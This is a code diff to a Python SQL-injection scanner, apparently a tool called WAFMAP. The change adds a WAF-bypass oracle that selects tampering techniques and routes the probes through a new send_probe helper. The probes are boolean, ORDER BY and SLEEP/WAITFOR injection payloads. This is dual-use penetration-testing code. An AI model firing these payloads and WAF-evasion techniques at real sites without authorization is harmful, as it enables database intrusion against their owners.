@@ -1,6 +1,7 @@
 import time
 import difflib
 from .tampering import apply_tampering
+from . import bypass_oracle
 from bs4 import BeautifulSoup
 
 SQLI_ERROR_MARKERS = [
@@ -28,14 +29,22 @@ def load_payloads_from_file(filename="payloads/sqli.txt"):
         return ["' OR '1'='1"]
 
 
-def get_response_metrics(engine, url, method, data, params):
+def send_probe(engine, url, method, base_params, param_name, raw_text, waf_bypass_enabled, waf_name, technique):
+    value = apply_tampering(raw_text, 'sqli', waf_bypass_enabled, waf_name, technique=technique)
+
     start = time.time()
-    is_post = method == 'POST'
-    resp = engine._send_request(url, method=method, data=data if is_post else None, params=params if not is_post else None)
+    if waf_bypass_enabled:
+        resp = engine._send_request_raw(url, method, base_params, param_name, value)
+    else:
+        data = dict(base_params)
+        data[param_name] = value
+        resp = engine._send_request(url, method=method, data=data if method == 'POST' else None,
+                                     params=data if method == 'GET' else None)
     duration = time.time() - start
+
     if resp is not None:
-        return duration, resp.status_code, len(resp.text), resp.text
-    return duration, 0, 0, ""
+        return duration, resp.status_code, len(resp.text), resp.text, value
+    return duration, 0, 0, "", value
 
 
 def _profile_boolean_diff(text_true, text_fail):
@@ -62,27 +71,25 @@ def _profile_boolean_diff(text_true, text_fail):
     return profile
 
 
-def discover_column_count(engine, url, method, data_template, param_name):
+def discover_column_count(engine, url, method, base_params, param_name, waf_bypass_enabled, waf_name, technique):
     max_columns = 15
-    is_post = method == 'POST'
-    template = data_template.copy()
 
-    resp_base = engine._send_request(url, method=method, data=template if is_post else None, params=template if not is_post else None)
-    if resp_base is None:
+    base_resp = engine._send_request(url, method=method,
+                                      data=base_params if method == 'POST' else None,
+                                      params=base_params if method == 'GET' else None)
+    if base_resp is None:
         return None
-    base_code = resp_base.status_code
+    base_code = base_resp.status_code
 
     for count in range(1, max_columns + 1):
-        payload = f"' ORDER BY {count} -- "
-        req_data = template.copy()
-        req_data[param_name] = payload
-
-        resp = engine._send_request(url, method=method, data=req_data if is_post else None, params=req_data if not is_post else None)
-
-        if resp is not None:
-            is_error = resp.status_code != base_code or any(err.lower() in resp.text.lower() for err in SQLI_ERROR_MARKERS)
-            if is_error:
-                return count - 1
+        raw = f"' ORDER BY {count} -- "
+        _, code, _, text, _ = send_probe(engine, url, method, base_params, param_name, raw,
+                                          waf_bypass_enabled, waf_name, technique)
+        if code == 0:
+            continue
+        is_error = code != base_code or any(err.lower() in text.lower() for err in SQLI_ERROR_MARKERS)
+        if is_error:
+            return count - 1
 
     return None
 
@@ -96,45 +103,38 @@ def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled
     if method == 'POST' and hasattr(engine, 'csrf_token') and isinstance(engine.csrf_token, dict):
         csrf_token_data = engine.csrf_token
 
-    dummy_val = "WAFMAP_SAFE_VAL"
-    base_data = defaults.copy()
-    if method == 'POST':
-        base_data.update(csrf_token_data)
-
     base_params = defaults.copy()
-    if method == 'GET':
+    if method == 'POST':
         base_params.update(csrf_token_data)
+    base_params[param_name] = "WAFMAP_SAFE_VAL"
 
-    data_template = base_data if method == 'POST' else base_params
-    data_template[param_name] = dummy_val
+    forced_technique = None
+    if waf_bypass_enabled:
+        forced_technique = bypass_oracle.probe_and_get_technique(
+            engine, url, method, base_params, param_name, 'sqli', waf_name
+        )
 
     column_count = None
     if level >= 2:
-        column_count = discover_column_count(engine, url, method, data_template, param_name)
+        column_count = discover_column_count(engine, url, method, base_params, param_name,
+                                              waf_bypass_enabled, waf_name, forced_technique)
 
-    baseline_time_1, base_code, base_len, base_text = get_response_metrics(
-        engine, url, method, data_template if method == 'POST' else None, data_template if method == 'GET' else None
-    )
+    baseline_time_1, base_code, base_len, base_text, _ = send_probe(
+        engine, url, method, base_params, param_name, "WAFMAP_SAFE_VAL", waf_bypass_enabled, waf_name, forced_technique)
     if base_code == 0:
         return
 
-    baseline_time_2, _, _, _ = get_response_metrics(
-        engine, url, method, data_template if method == 'POST' else None, data_template if method == 'GET' else None
-    )
+    baseline_time_2, _, _, _, _ = send_probe(
+        engine, url, method, base_params, param_name, "WAFMAP_SAFE_VAL", waf_bypass_enabled, waf_name, forced_technique)
     baseline_time = max(baseline_time_1, baseline_time_2)
 
-    true_payload = "WAFMAP_SAFE_VAL' OR 1=1 -- "
-    false_payload = "WAFMAP_SAFE_VAL' OR 1=0 -- "
+    true_raw = "WAFMAP_SAFE_VAL' OR 1=1 -- "
+    false_raw = "WAFMAP_SAFE_VAL' OR 1=0 -- "
 
-    data_fail = data_template.copy()
-    data_fail[param_name] = false_payload
-    _, _, _, text_fail = get_response_metrics(engine, url, method, data_fail if method == 'POST' else None, data_fail if method == 'GET' else None)
+    _, _, _, text_fail, _ = send_probe(engine, url, method, base_params, param_name, false_raw, waf_bypass_enabled, waf_name, forced_technique)
+    _, _, _, text_true, _ = send_probe(engine, url, method, base_params, param_name, true_raw, waf_bypass_enabled, waf_name, forced_technique)
+    _, _, _, text_true_retry, _ = send_probe(engine, url, method, base_params, param_name, true_raw, waf_bypass_enabled, waf_name, forced_technique)
 
-    data_true = data_template.copy()
-    data_true[param_name] = true_payload
-    _, _, _, text_true = get_response_metrics(engine, url, method, data_true if method == 'POST' else None, data_true if method == 'GET' else None)
-
-    _, _, _, text_true_retry = get_response_metrics(engine, url, method, data_true if method == 'POST' else None, data_true if method == 'GET' else None)
     stability = difflib.SequenceMatcher(None, text_true, text_true_retry).ratio()
     page_is_stable = stability >= STABILITY_THRESHOLD
 
@@ -155,12 +155,8 @@ def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled
         if level == 1 and ("SLEEP" in payload or "WAITFOR" in payload):
             continue
 
-        final_payload = apply_tampering(payload, 'sqli', waf_bypass_enabled, waf_name)
-
-        data = data_template.copy()
-        data[param_name] = final_payload
-
-        req_time, code, length, text = get_response_metrics(engine, url, method, data if method == 'POST' else None, data if method == 'GET' else None)
+        req_time, code, length, text, final_payload = send_probe(
+            engine, url, method, base_params, param_name, payload, waf_bypass_enabled, waf_name, forced_technique)
 
         if code == 0:
             continue
@@ -174,14 +170,15 @@ def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled
         if error_hit:
             return
 
-        if "WAFMAP" in text:
+        if "WAFMAP" in text.upper():
             payload_cols = payload.upper().count('WAFMAP')
             if not column_count or payload_cols == column_count:
                 engine.add_vulnerability("SQLi (In-Band)", url, final_payload, "Marqueur reflété", parameter=param_name)
                 return
 
         if ("SLEEP" in payload or "WAITFOR" in payload) and req_time > (baseline_time + TIME_MARGIN_SECONDS):
-            confirm_time, _, _, _ = get_response_metrics(engine, url, method, data if method == 'POST' else None, data if method == 'GET' else None)
+            confirm_time, _, _, _, _ = send_probe(
+                engine, url, method, base_params, param_name, payload, waf_bypass_enabled, waf_name, forced_technique)
 
             if confirm_time > (baseline_time + TIME_MARGIN_SECONDS):
                 engine.add_vulnerability(
@@ -206,9 +203,8 @@ def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled
             return
 
         if is_boolean_vulnerable:
-            data_attack = data_template.copy()
-            data_attack[param_name] = final_payload
-            _, _, _, text_attack = get_response_metrics(engine, url, method, data_attack if method == 'POST' else None, data_attack if method == 'GET' else None)
+            _, _, _, text_attack, _ = send_probe(
+                engine, url, method, base_params, param_name, payload, waf_bypass_enabled, waf_name, forced_technique)
 
             is_semantic_success = semantic_profile['success_found'] and any(kw in text_attack.lower() for kw in SUCCESS_KEYWORDS)
             sim_attack = difflib.SequenceMatcher(None, text_true, text_attack).ratio()
@@ -217,6 +213,8 @@ def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled
                 details = f"Réponse similaire à l'état VRAI (Similitude: {sim_attack:.3f}, stabilité page: {stability:.3f})"
                 if is_semantic_success:
                     details += " - Confirmation sémantique (Succès)"
+                if waf_bypass_enabled and forced_technique:
+                    details += f" - Technique de bypass utilisée : {forced_technique}"
 
                 engine.add_vulnerability("SQLi (Boolean Blind)", url, final_payload, details, parameter=param_name)
                 return
